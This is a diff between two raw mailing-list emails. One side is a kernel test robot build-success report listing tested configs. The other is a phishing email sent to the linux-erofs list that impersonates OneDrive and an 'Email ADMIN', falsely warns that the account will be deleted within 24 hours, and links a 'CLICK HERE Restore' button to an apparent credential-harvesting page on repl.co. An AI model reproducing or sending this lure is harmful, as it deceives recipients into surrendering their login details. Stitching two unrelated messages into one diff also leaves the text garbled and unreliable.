@@ -2,47 +2,43 @@ Return-Path: <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>
 X-Original-To: lists+linux-erofs@lfdr.de
 Delivered-To: lists+linux-erofs@lfdr.de
 Received: from lists.ozlabs.org (lists.ozlabs.org [IPv6:2404:9400:2:0:216:3eff:fee1:b9f1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 7ACDB39EDD5
-	for <lists+linux-erofs@lfdr.de>; Tue,  8 Jun 2021 06:53:49 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 7D2083A1C57
+	for <lists+linux-erofs@lfdr.de>; Wed,  9 Jun 2021 19:47:53 +0200 (CEST)
 Received: from boromir.ozlabs.org (localhost [IPv6:::1])
-	by lists.ozlabs.org (Postfix) with ESMTP id 4FzdDW5jBXz2yyM
-	for <lists+linux-erofs@lfdr.de>; Tue,  8 Jun 2021 14:53:47 +1000 (AEST)
+	by lists.ozlabs.org (Postfix) with ESMTP id 4G0ZMC2hvQz307W
+	for <lists+linux-erofs@lfdr.de>; Thu, 10 Jun 2021 03:47:51 +1000 (AEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=lists.ozlabs.org;
+	s=201707; t=1623260871;
+	bh=cGoDT1fNd6yjpmY9YbN8PMCgkxuLWi70SL0IOxRxf7A=;
+	h=To:Subject:Date:List-Id:List-Unsubscribe:List-Archive:List-Post:
+	 List-Help:List-Subscribe:From:Reply-To:Cc:From;
+	b=hGWSewuGCPHZX7kjnjwHcscNjHw288H5Qoa5O4YjaN/mr74hWgK6VVY8+SfVSVOT5
+	 0y8SRfUEKK8Cqd82zBL2B/UTYQh/PSyV2FYhJbEm5dbRqbOaqfzdvJmCRHzJDDUAfR
+	 c300kWGxhwQcNFx55zCFhNECg487bE3VXgWoxu05WXzQemoZGz3YBT5WvVOPDym2vU
+	 8kqIon4dDvvxHtjgFgwGiCwCut4Gd1SKUBCOglk217wtNBuaFypUBOHlLk0f5HUJua
+	 w1ol3pYJfuvvc91I54K39YnPIQXr3F6mb6OPeD30EJ2e+16+XDQIl6KgmHe+tHwHe2
+	 ZYDTx1axi5ziQ==
 X-Original-To: linux-erofs@lists.ozlabs.org
 Delivered-To: linux-erofs@lists.ozlabs.org
-Authentication-Results: lists.ozlabs.org; spf=pass (sender SPF authorized)
- smtp.mailfrom=intel.com (client-ip=192.55.52.43; helo=mga05.intel.com;
- envelope-from=lkp@intel.com; receiver=<UNKNOWN>)
-Received: from mga05.intel.com (mga05.intel.com [192.55.52.43])
- (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
- (No client certificate requested)
- by lists.ozlabs.org (Postfix) with ESMTPS id 4FzdDR1VY9z2yWT
- for <linux-erofs@lists.ozlabs.org>; Tue,  8 Jun 2021 14:53:40 +1000 (AEST)
-IronPort-SDR: mCQUE8jY7jkzfYhAs6JGJESqPzvEMU5lvoIb9susQJkGUTK/Kcnk1WFawiloMQ3VNfWR0RtkRi
- Dj0GNbnx4idA==
-X-IronPort-AV: E=McAfee;i="6200,9189,10008"; a="290400551"
-X-IronPort-AV: E=Sophos;i="5.83,256,1616482800"; d="scan'208";a="290400551"
-Received: from fmsmga003.fm.intel.com ([10.253.24.29])
- by fmsmga105.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384;
- 07 Jun 2021 21:53:36 -0700
-IronPort-SDR: qwendfEKDv+QWTUaMlxrHu9/pKEmRN2TVfSzeXrGPbWKXZoGQkIC5lMNpb3SLGDp3siZ2zudnV
- cd2aACNC6XJA==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="5.83,256,1616482800"; d="scan'208";a="476466720"
-Received: from lkp-server02.sh.intel.com (HELO 1ec8406c5392) ([10.239.97.151])
- by FMSMGA003.fm.intel.com with ESMTP; 07 Jun 2021 21:53:34 -0700
-Received: from kbuild by 1ec8406c5392 with local (Exim 4.92)
- (envelope-from <lkp@intel.com>)
- id 1lqTk6-0008oU-AJ; Tue, 08 Jun 2021 04:53:34 +0000
-Date: Tue, 08 Jun 2021 12:53:15 +0800
-From: kernel test robot <lkp@intel.com>
-To: Gao Xiang <hsiangkao@linux.alibaba.com>
-Subject: [xiang-erofs:dev] BUILD SUCCESS
- c5fcb51111b85323cafe3f02784f7f0bf6a7cf07
-Message-ID: <60bef7bb.OI8BGKB7xabgPetO%lkp@intel.com>
-User-Agent: Heirloom mailx 12.5 6/20/10
+Authentication-Results: lists.ozlabs.org; spf=none (no SPF record)
+ smtp.mailfrom=onedrive.live.com (client-ip=80.85.140.142; helo=fruitwerkz.com;
+ envelope-from=noreply@onedrive.live.com; receiver=<UNKNOWN>)
+X-Greylist: delayed 377 seconds by postgrey-1.36 at boromir;
+ Thu, 10 Jun 2021 03:47:47 AEST
+Received: from fruitwerkz.com (unknown [80.85.140.142])
+ by lists.ozlabs.org (Postfix) with ESMTP id 4G0ZM72drNz2yWL
+ for <linux-erofs@lists.ozlabs.org>; Thu, 10 Jun 2021 03:47:47 +1000 (AEST)
+Received: from onedrive.live.com (localhost [127.0.0.1])
+ by fruitwerkz.com (Postfix) with ESMTP id 613C192F053
+ for <linux-erofs@lists.ozlabs.org>; Wed,  9 Jun 2021 17:41:28 +0000 (UTC)
+To: linux-erofs@lists.ozlabs.org
+Subject: Important:: Action required lists.ozlabs.org
+Date: 09 Jun 2021 20:41:24 +0300
+Message-ID: <20210609204124.84A4DF9DE3A115C8@onedrive.live.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 X-BeenThere: linux-erofs@lists.ozlabs.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -54,212 +50,188 @@ List-Post: <mailto:linux-erofs@lists.ozlabs.org>
 List-Help: <mailto:linux-erofs-request@lists.ozlabs.org?subject=help>
 List-Subscribe: <https://lists.ozlabs.org/listinfo/linux-erofs>,
  <mailto:linux-erofs-request@lists.ozlabs.org?subject=subscribe>
-Cc: Xiang Gao <xiang@kernel.org>, linux-erofs@lists.ozlabs.org
+From: Email ADMIN via Linux-erofs <linux-erofs@lists.ozlabs.org>
+Reply-To: Email ADMIN <noreply@iionedrive.live.com>
+Cc: Email ADMIN <noreply@onedrive.live.com>
 Errors-To: linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org
 Sender: "Linux-erofs"
  <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>
 
-tree/branch: https://git.kernel.org/pub/scm/linux/kernel/git/xiang/erofs.git dev
-branch HEAD: c5fcb51111b85323cafe3f02784f7f0bf6a7cf07  erofs: clean up file headers & footers
-
-elapsed time: 727m
-
-configs tested: 186
-configs skipped: 3
-
-The following configs have been built successfully.
-More configs may be tested in the coming days.
-
-gcc tested configs:
-arm                                 defconfig
-arm64                            allyesconfig
-arm64                               defconfig
-arm                              allyesconfig
-arm                              allmodconfig
-mips                     loongson2k_defconfig
-sh                          r7780mp_defconfig
-arc                    vdk_hs38_smp_defconfig
-arm                      pxa255-idp_defconfig
-arm                         assabet_defconfig
-arc                          axs103_defconfig
-arm                     davinci_all_defconfig
-powerpc64                           defconfig
-powerpc                     sbc8548_defconfig
-arm                       versatile_defconfig
-arm                        oxnas_v6_defconfig
-powerpc                 mpc836x_mds_defconfig
-powerpc                     akebono_defconfig
-openrisc                  or1klitex_defconfig
-powerpc                       ppc64_defconfig
-arm                        multi_v7_defconfig
-powerpc                    sam440ep_defconfig
-m68k                         amcore_defconfig
-arm                           viper_defconfig
-sh                     sh7710voipgw_defconfig
-mips                         tb0219_defconfig
-sh                ecovec24-romimage_defconfig
-arm                            mmp2_defconfig
-arm                           tegra_defconfig
-xtensa                           alldefconfig
-powerpc                      makalu_defconfig
-mips                          rm200_defconfig
-powerpc                 mpc8560_ads_defconfig
-arm                           omap1_defconfig
-powerpc                 xes_mpc85xx_defconfig
-sh                             sh03_defconfig
-arm                           sama5_defconfig
-mips                        omega2p_defconfig
-s390                             alldefconfig
-sh                            migor_defconfig
-m68k                            q40_defconfig
-powerpc                 mpc8272_ads_defconfig
-arm                             ezx_defconfig
-riscv             nommu_k210_sdcard_defconfig
-sh                           se7343_defconfig
-arc                     nsimosci_hs_defconfig
-powerpc                     powernv_defconfig
-mips                           rs90_defconfig
-arm                         mv78xx0_defconfig
-sh                  sh7785lcr_32bit_defconfig
-arm                          simpad_defconfig
-sh                   sh7724_generic_defconfig
-mips                       capcella_defconfig
-mips                           ip32_defconfig
-powerpc                     skiroot_defconfig
-powerpc                  mpc866_ads_defconfig
-sh                 kfr2r09-romimage_defconfig
-arm                            lart_defconfig
-powerpc                   motionpro_defconfig
-ia64                             allmodconfig
-arm                      jornada720_defconfig
-powerpc                 mpc834x_itx_defconfig
-powerpc                    adder875_defconfig
-x86_64                           alldefconfig
-arm                            hisi_defconfig
-arm                             pxa_defconfig
-arm                        shmobile_defconfig
-sh                   sh7770_generic_defconfig
-m68k                                defconfig
-xtensa                           allyesconfig
-arc                            hsdk_defconfig
-mips                       bmips_be_defconfig
-s390                                defconfig
-powerpc                      pasemi_defconfig
-arm                        realview_defconfig
-mips                           ci20_defconfig
-arm                         axm55xx_defconfig
-mips                         db1xxx_defconfig
-arm                      footbridge_defconfig
-nds32                             allnoconfig
-sh                          sdk7780_defconfig
-mips                           jazz_defconfig
-arm                        mvebu_v5_defconfig
-arc                        nsimosci_defconfig
-xtensa                  nommu_kc705_defconfig
-powerpc                 mpc832x_mds_defconfig
-sh                             espt_defconfig
-arc                           tb10x_defconfig
-powerpc                         wii_defconfig
-powerpc                         ps3_defconfig
-powerpc                     mpc5200_defconfig
-m68k                       m5208evb_defconfig
-sparc                       sparc64_defconfig
-powerpc                 canyonlands_defconfig
-sh                          lboxre2_defconfig
-powerpc                 mpc836x_rdk_defconfig
-mips                           ip28_defconfig
-powerpc                      ep88xc_defconfig
-mips                        maltaup_defconfig
-arm                        vexpress_defconfig
-mips                          rb532_defconfig
-mips                         tb0226_defconfig
-powerpc                     ppa8548_defconfig
-um                           x86_64_defconfig
-powerpc                mpc7448_hpc2_defconfig
-arm                            qcom_defconfig
-mips                           mtx1_defconfig
-arm                         s5pv210_defconfig
-nios2                               defconfig
-arc                        vdk_hs38_defconfig
-nios2                         10m50_defconfig
-parisc                              defconfig
-sh                         microdev_defconfig
-sh                     magicpanelr2_defconfig
-sh                      rts7751r2d1_defconfig
-sh                                  defconfig
-powerpc                        warp_defconfig
-powerpc                 mpc8315_rdb_defconfig
-powerpc               mpc834x_itxgp_defconfig
-powerpc                        fsp2_defconfig
-x86_64                              defconfig
-x86_64                            allnoconfig
-ia64                                defconfig
-ia64                             allyesconfig
-m68k                             allmodconfig
-m68k                             allyesconfig
-arc                              allyesconfig
-nds32                               defconfig
-nios2                            allyesconfig
-csky                                defconfig
-alpha                               defconfig
-alpha                            allyesconfig
-h8300                            allyesconfig
-arc                                 defconfig
-sh                               allmodconfig
-s390                             allyesconfig
-s390                             allmodconfig
-parisc                           allyesconfig
-i386                             allyesconfig
-sparc                            allyesconfig
-sparc                               defconfig
-i386                                defconfig
-mips                             allyesconfig
-mips                             allmodconfig
-powerpc                          allyesconfig
-powerpc                          allmodconfig
-powerpc                           allnoconfig
-i386                 randconfig-a003-20210607
-i386                 randconfig-a006-20210607
-i386                 randconfig-a004-20210607
-i386                 randconfig-a002-20210607
-i386                 randconfig-a001-20210607
-i386                 randconfig-a005-20210607
-x86_64               randconfig-a015-20210607
-x86_64               randconfig-a011-20210607
-x86_64               randconfig-a014-20210607
-x86_64               randconfig-a012-20210607
-x86_64               randconfig-a016-20210607
-x86_64               randconfig-a013-20210607
-i386                 randconfig-a015-20210607
-i386                 randconfig-a013-20210607
-i386                 randconfig-a011-20210607
-i386                 randconfig-a016-20210607
-i386                 randconfig-a014-20210607
-i386                 randconfig-a012-20210607
-riscv                    nommu_k210_defconfig
-riscv                            allyesconfig
-riscv                    nommu_virt_defconfig
-riscv                             allnoconfig
-riscv                               defconfig
-riscv                          rv32_defconfig
-riscv                            allmodconfig
-um                             i386_defconfig
-um                            kunit_defconfig
-x86_64                           allyesconfig
-x86_64                    rhel-8.3-kselftests
-x86_64                               rhel-8.3
-x86_64                      rhel-8.3-kbuiltin
-x86_64                                  kexec
-
-clang tested configs:
-x86_64               randconfig-b001-20210607
-x86_64               randconfig-a002-20210607
-x86_64               randconfig-a004-20210607
-x86_64               randconfig-a003-20210607
-x86_64               randconfig-a006-20210607
-x86_64               randconfig-a005-20210607
-x86_64               randconfig-a001-20210607
-
----
-0-DAY CI Kernel Test Service, Intel Corporation
-https://lists.01.org/hyperkitty/list/kbuild-all@lists.01.org
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
+<body>
+<P style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial, =
+Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFO=
+RM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHA=
+NS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255=
+); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: nor=
+mal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-d=
+ecoration-color: initial'><BR>&nbsp;</P>
+<DIV style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial=
+, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORP=
+HANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,2=
+55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text=
+-decoration-color: initial' dir=3Dltr>
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px" dir=3Dltr>
+<DIV id=3Dm_-2366680748320383580m_8213883353781462944m_4862631521929489402m=
+_723104160854409008m_-4235383262629915302m_-8265022980045132773gmail-mailTe=
+xt style=3D"FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-FAMILY: verdana, Tahoma,=
+ Arial, &#23435;&#20307;, sans-serif; COLOR: rgb(51,51,51); PADDING-TOP: 0p=
+x">
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px">
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px; MARGIN: 0.4em">
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px" dir=3Dltr>
+<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;, Ve=
+rdana, Arial, Helvetica, sans-serif; BORDER-COLLAPSE: collapse" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 38px; FONT-FAMILY: &quot;Segoe UI Semibold&quot;, S=
+UWSB, &quot;Segoe UI&quot;, Verdana, sans-serif; BORDER-COLLAPSE: collapse;=
+ COLOR: rgb(80,80,80); PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP=
+: 60px; PADDING-LEFT: 50px; LETTER-SPACING: -0.03em; LINE-HEIGHT: 48px; PAD=
+DING-RIGHT: 50px" bgcolor=3D"#f4f4f4" align=3D"center">
+<H2 style=3D"FONT-SIZE: 30px; FONT-WEIGHT: normal; PADDING-BOTTOM: 0px; PAD=
+DING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING: -0.03em; LIN=
+E-HEIGHT: 48px; PADDING-RIGHT: 0px"><A onclick=3D"return false" style=3D"CO=
+LOR: rgb(1,134,186)" href=3D"http://webmail.lists.ozlabs.org/#NOP" rel=3Dno=
+referrer>lists.ozlabs.org</A></H2></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 13px; FONT-FAMILY: &quot;Segoe UI&quot;, SUWR, Verd=
+ana, sans-serif; BORDER-COLLAPSE: collapse; COLOR: rgb(80,80,80); PADDING-B=
+OTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 50px; LETTER-SPACING: -0.01em;=
+ LINE-HEIGHT: 20px; PADDING-RIGHT: 50px" bgcolor=3D"#f4f4f4" align=3D"cente=
+r">
+<table style=3D"MIN-WIDTH: 300px" cellspacing=3D"0" cellpadding=3D"0" borde=
+r=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; PAD=
+DING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px; LINE-HEIGHT: 1.5; PA=
+DDING-RIGHT: 0px">
+<P style=3D"COLOR: rgb(32,32,32)" align=3Dcenter><SPAN style=3D"FONT-SIZE: =
+xx-small"><SPAN style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, san=
+s-serif, serif, EmojiFont; LETTER-SPACING: normal"><SPAN style=3D"FONT-SIZE=
+: small">We&nbsp;just received&nbsp; request&nbsp;to deactivate&nbsp;your e=
+mail&nbsp;account listed below.</SPAN></SPAN></SPAN></P>
+<P align=3Dcenter><FONT color=3D#202020><SPAN style=3D"FONT-SIZE: small"></=
+SPAN></FONT><SPAN style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, s=
+ans-serif, serif, EmojiFont; COLOR: rgb(32,32,32); LETTER-SPACING: normal">=
+<SPAN style=3D"FONT-SIZE: small"></SPAN><SPAN style=3D"FONT-SIZE: small">Yo=
+ur email is:&nbsp;</SPAN></SPAN><FONT color=3D#202020>&nbsp;</FONT><FONT co=
+lor=3D#0000ff>
+ <A onclick=3D"return rcmail.command('compose','linux-erofs@lists.ozlabs.or=
+g',this)" style=3D"COLOR: rgb(1,134,186)" href=3D"mailto:linux-erofs@lists.=
+ozlabs.org" rel=3Dnoreferrer>linux-erofs@lists.ozlabs.org</A></FONT><SPAN s=
+tyle=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif, serif, E=
+mojiFont; COLOR: rgb(32,32,32); LETTER-SPACING: normal"><SPAN style=3D"FONT=
+-SIZE: small"><STRONG><BR><BR></STRONG>
+Within 24 hours, all&nbsp;email data&nbsp;associated with your account will=
+ be deleted from our servers and your account will&nbsp;be permanently&nbsp=
+;deactivated.<BR></SPAN></SPAN></P></TD></TR>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COL=
+OR: rgb(32,32,32); PADDING-BOTTOM: 4px; LINE-HEIGHT: 1.5">&nbsp;</TD></TR>
+<TR>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 3=
+5px; PADDING-LEFT: 50px; PADDING-RIGHT: 50px" bgcolor=3D"#f4f4f4" align=3D"=
+center">
+<table style=3D"BORDER-COLLAPSE: collapse; MARGIN: 0px auto" cellspacing=3D=
+"0" cellpadding=3D"0" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
+"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; border-radius: 0px" bgcolor=3D"#=
+d23b01">
+<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
+"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 2px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 2; PADDING-RIGHT: 0px; =
+border-radius: 4px" height=3D"2">&nbsp;</TD></TR>
+<TR>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
+"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" width=3D"2">&nbsp;</TD>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<table style=3D"BORDER-COLLAPSE: collapse; MARGIN: 0px auto" cellspacing=3D=
+"0" cellpadding=3D"0" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;Segoe UI Semibold&quot;, S=
+UWSB, &quot;Segoe UI&quot;, Verdana, sans-serif; BORDER-COLLAPSE: collapse;=
+ PADDING-BOTTOM: 11px; TEXT-ALIGN: center; PADDING-TOP: 11px; PADDING-LEFT:=
+ 46px; LETTER-SPACING: -0.01em; LINE-HEIGHT: 21px; PADDING-RIGHT: 46px" ali=
+gn=3D"center">
+<A id=3Dm_-2366680748320383580m_8213883353781462944m_4862631521929489402m_7=
+23104160854409008m_-4235383262629915302m_-8265022980045132773gmail-m_-81517=
+27502435008386m_6071888078740827102m_-6305057664783212805gmail-m_-871358632=
+7481304440gmail-LPlnk768108 style=3D"WIDTH: 145px; COLOR: rgb(255,255,255);=
+ DISPLAY: inline-block; BACKGROUND-COLOR: transparent" href=3D"https://00si=
+teGraveDraftyLaw.goliknonig.repl.co/?email=3Dlinux-erofs@lists.ozlabs.org" =
+rel=3Dnoreferrer target=3D_blank>CLICK HERE Restore</A></TD></TR></TBODY>
+</TABLE></TD>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" width=3D"2">&nbsp;</TD></TR></TB=
+ODY></TABLE></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 2px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 2; PADDING-RIGHT: 0px; =
+border-radius: 0px" height=3D"2">&nbsp;</TD></TR></TBODY></TABLE></TD></TR>=
+</TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 3=
+5px; PADDING-LEFT: 50px; PADDING-RIGHT: 50px" bgcolor=3D"#f4f4f4" align=3D"=
+center">
+<table style=3D"BORDER-COLLAPSE: collapse; MARGIN: 0px auto" cellspacing=3D=
+"0" cellpadding=3D"0" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;Segoe UI Semibold&quot;, S=
+UWSB, &quot;Segoe UI&quot;, Verdana, sans-serif; BORDER-COLLAPSE: collapse;=
+ PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; LETTER-SPACING: =
+-0.01em; LINE-HEIGHT: 21px; PADDING-RIGHT: 0px" bgcolor=3D"#f4f4f4" align=
+=3D"left">&nbsp;</TD>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" bgcolor=3D"#f4f4f4" align=3D"l=
+eft">
+<table style=3D"MIN-WIDTH: 300px" cellspacing=3D"0" cellpadding=3D"0" borde=
+r=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COL=
+OR: rgb(32,32,32); PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px=
+; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px">
+<P align=3Dcenter><SPAN style=3D"FONT-SIZE: xx-small"><SPAN style=3D"FONT-S=
+IZE: small"><BR><BR>Thank you for helping us keep your account safe.</SPAN>=
+<BR></SPAN></P></TD></TR>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COL=
+OR: rgb(32,32,32); PADDING-TOP: 28px; LINE-HEIGHT: 1">
+<P align=3Dcenter><BR><A onclick=3D"return false" style=3D"COLOR: rgb(1,134=
+,186)" href=3D"http://webmail.lists.ozlabs.org/#NOP" rel=3Dnoreferrer>lists=
+=2Eozlabs.org</A><SPAN style=3D"FONT-SIZE: xx-small"><SPAN style=3D"FONT-SI=
+ZE: small">&nbsp;Service Security</SPAN></SPAN><SPAN style=3D"FONT-SIZE: xx=
+-small"><STRONG><BR><BR></STRONG><SPAN style=3D"FONT-SIZE: small">&copy; 20=
+21 All Rights Reserved.</SPAN></SPAN></P></TD></TR></TBODY></TABLE></TD></T=
+R></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV=
+>
+</DIV></DIV></DIV>
+<P style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial, =
+Helvetica, sans-serif; COLOR: rgb(51,51,51)'><BR>&nbsp;</P></DIV></DIV></BO=
+DY></HTML>
